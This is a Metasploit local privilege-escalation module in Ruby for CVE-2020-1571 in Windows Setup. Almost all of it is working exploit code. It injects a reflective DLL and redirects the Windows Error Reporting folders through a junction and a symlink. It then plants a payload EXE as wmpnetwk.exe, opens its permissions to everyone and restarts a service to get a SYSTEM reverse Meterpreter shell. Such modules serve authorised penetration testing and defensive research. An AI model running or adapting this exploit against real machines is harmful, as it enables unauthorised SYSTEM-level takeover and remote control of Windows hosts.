##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
  include Msf::Post::Windows::Priv # Needed for is_system?
  include Msf::Exploit::EXE # Needed for generate_payload_exe
  include Msf::Post::Windows::FileSystem # Needed for create_symlink
  include Msf::Exploit::FileDropper # Needed for register_file_for_cleanup
  include Msf::Post::File # Needed for write_file
  include Msf::Post::Windows::ReflectiveDLLInjection # Needed for inject_dll_into_process

  def initialize(info = {})
    super(
        update_info(
          info,
          'Name' => 'Windows Setup Arbitrary File Deletion Local Privilege Escalation',
          'Description' => %q{
            This module exploits an oversight when patching CVE-2020-1571 where Microsoft correctly changed the Windows Setup program's behavior
            so that it removed a Time-Of-Check-Time-Of-Use bug when creating the directory C:\$WINDOWS.~BT, however they forgot to check whether
            or not this folder was a reparse point prior to deleting the directory. Attackers can exploit this vulnerability to delete arbitrary
            folders on the system as the SYSTEM user, which can be used to gain code execution as SYSTEM via known DLL hijacking issues within
            Windows.

            Note that this module will only work on Windows 10 v1909 and prior as was noted by author who found this bug. This is in contrast
            to Microsoft's advisory of CVE-2020-1571 which notes that the bug is also exploitable on Windows 10 v2004.
          },
          'License' => MSF_LICENSE,
          'Author' =>
              [
                'klinix5', # Aka Abdelhamid Naceri, who was the original finder of CVE-2020-1571 and who found the bypass in the patch.
                'gwillcox-r7', # msf module
                'jonaslyk' # Directory deletion to SYSTEM shell technique and assistance with questions.
              ],
          'Platform' => ['win'],
          'SessionTypes' => ['meterpreter'],
          'Privileged' => true,
          'Arch' => [ARCH_X64],
          'Targets' =>
              [
                [ 'Windows EXE Dropper', { 'Arch' => [ARCH_X64], 'Type' => :windows_dropper } ],
              ],
          'DefaultTarget' => 0,
          'DisclosureDate' => '2020-08-11',
          'References' =>
              [
                ['CVE', '2020-1571'],
                ['URL', 'https://github.com/klinix5/Windows-Setup-EoP'],
                ['URL', 'https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html'],
                ['URL', 'https://secret.club/2020/04/23/directory-deletion-shell.html'],
              ],
          'Notes' =>
              {
                'SideEffects' => [ CONFIG_CHANGES, ARTIFACTS_ON_DISK ],
                'Reliability' => [ REPEATABLE_SESSION ],
                'Stability' => [ CRASH_SAFE ]
              },
          'DefaultOptions' =>
              {
                'EXITFUNC' => 'thread',
                'PrependMigrate' => true,
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
                'WfsDelay' => 900
              }
        )
    )
    register_options(
      [
        OptString.new('WritableDir', [ true, 'The location of a directory the current user can write to', 'C:\\Windows\\Temp\\' ]),
        OptInt.new('WaitTime', [ true, "Number of minutes to wait for the reflectively injected DLL's operations to complete before continuing", 10 ]),
      ]
    )
  end

  def move_folders_out_of_wer
    relocation_dir = "#{datastore['WritableDir']}\\#{Rex::Text.rand_text_alpha(6..13)}"
    vprint_status('Making the temp folder which will house the folders that we move out of the WER directory...')
    mkdir(relocation_dir)
    register_dir_for_cleanup(relocation_dir)

    begin
      rename_file("C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive", "#{relocation_dir}\\ReportArchive")
    rescue Rex::Post::Meterpreter::RequestError
      # Don't do anything, this error likely occurred cause the file didn't exist, and that is fine.
    end
    begin
      rename_file("C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue", "#{relocation_dir}\\ReportQueue")
    rescue Rex::Post::Meterpreter::RequestError
      # Don't do anything, this error likely occurred cause the file didn't exist, and that is fine.
    end
    begin
      rename_file("C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp", "#{relocation_dir}\\Temp")
    rescue Rex::Post::Meterpreter::RequestError
      # Don't do anything, this error likely occurred cause the file didn't exist, and that is fine.
    end

    vprint_good('Successfully moved the folders out of C:\\ProgramData\\Microsoft\\Windows\\WER!')
  end

  def create_wer_job
    cmd_exec('schtasks /end /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"')
    sleep(2)
    cmd_exec('schtasks /run /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"')
    sleep(5)
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated. Skipping exploitation...')
    end

    if sysinfo['Architecture'] =~ /wow64/i
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported (only x64 is supported)')
    elsif sysinfo['Architecture'] == ARCH_X86
      fail_with(Failure::NoTarget, 'Running against x86 is not supported (only x64 is supported)')
    end

    target_dir = 'C:\\$WINDOWS.~BT'
    session.fs.dir.rmdir(target_dir.to_s) if directory?(target_dir.to_s)
    session.fs.file.rm(target_dir.to_s) if file?(target_dir.to_s)

    process = client.sys.process.open
    reflective_dll_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-1571', 'CVE-2020-1571.x64.dll')
    exploit_mem, offset = inject_dll_into_process(process, reflective_dll_path)

    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset)
    print_status('Please go to Settings, Check for Updates, and then click Download and Install under the section titled Feature Update.')
    print_status("Sleeping for #{datastore['WaitTime']} minutes whilst the update process takes place and the DLL runs...")
    sleep(60 * datastore['WaitTime'])

    if directory?('C:\\Program Files\\Windows Media Player')
      fail_with(Failure::Unknown, "The directory C:\\Program Files\\Windows Media Player still exists, so exploit didn't complete successfully!")
    elsif directory?('C:\\ProgramData\\Microsoft\\Windows\\WER')
      fail_with(Failure::Unknown, "The directory C:\\ProgramData\\Microsoft\\Windows\\WER still exists, so exploit didn't complete successfully!")
    end

    print_good('Exploit successfully deleted the WER and Windows Media Player directories!')

    print_status('Using schtasks to run the QueueReporting task to create the WER directory with open permissions...')
    cmd_exec('schtasks /end /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"')
    cmd_exec('schtasks /run /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"')
    sleep(3)
    cmd_exec('schtasks /end /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"')

    unless directory?('C:\\ProgramData\\Microsoft\\Windows\\WER')
      print_error("Something went wrong, the WER directory wasn't recreated!")
    end
    move_folders_out_of_wer

    print_status('Creating mount point between the WER directory and \\RPC Control...')
    mount_point_handle = create_mount_point('\\??\\C:\\ProgramData\\Microsoft\\Windows\\WER', '\\RPC Control')
    if mount_point_handle.nil?
      fail_with(Failure::Unknown, 'Error when creating the directory junction... aborting.')
    end
    print_good('Created the directory junction successfully!')

    symlink_info = create_symlink(nil, '\\RPC Control\\Temp', '\\??\\c:\\Program Files\\Windows Media Player')
    unless symlink_info
      fail_with(Failure::Unknown, 'Error when creating the wermgr.exe.local symlink... aborting.')
    end
    print_good('Created the symbolic link between \\RPC Control\\Temp and \\??\\c:\\Program Files\\Windows Media Player successfully!')
    symlink_handle_value = symlink_info['LinkHandle']

    print_status('Running the QueueReporting task again to create the folder C:\\Program Files\\Windows Media Player with open permissions...')
    cmd_exec('schtasks /run /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"')
    sleep(5)
    exe = generate_payload_exe({ code: payload.encoded })
    write_file('C:\\Program Files\\Windows Media Player\\wmpnetwk.exe', exe)
    register_file_for_cleanup('C:\\Program Files\\Windows Media Player\\wmpnetwk.exe')
    print_good('Created the malicious EXE at C:\\Program Files\\Windows Media Player\\wmpnetwk.exe')

    print_status('Setting the permissions on the malicious EXE at C:\\Program Files\\Windows Media Player\\wmpnetwk.exe so that everyone can access it...')
    cmd_exec('icacls "C:\\Program Files\\Windows Media Player\\wmpnetwk.exe" /grant *S-1-1-0:(F)')

    vprint_status('Closing symbolic link handle...')
    session.railgun.kernel32.CloseHandle(symlink_handle_value)
    vprint_good('Closed symlink handle!')

    vprint_status('Cleaning up by removing the WER junction directory...')
    session.railgun.kernel32.CloseHandle(mount_point_handle)
    session.fs.dir.rmdir('C:\\ProgramData\\Microsoft\\Windows\\WER')
    vprint_good('Removed the WER junction directory!')
    cmd_exec('net stop WMPNetworkSvc')
    begin
      cmd_exec('net start WMPNetworkSvc')
    rescue Rex::TimeoutError
      # We expect this to happen, so lets keep going
    end
    print_good('Should be good to go, enjoy the shells!')
    sleep(10) # Sleep a bit to allow the service to run and for the automigrate to complete and the files to be deleted.
    # Without this sleep statement here, the payload that we drop will not be erased from the target system automatically.
  end
end
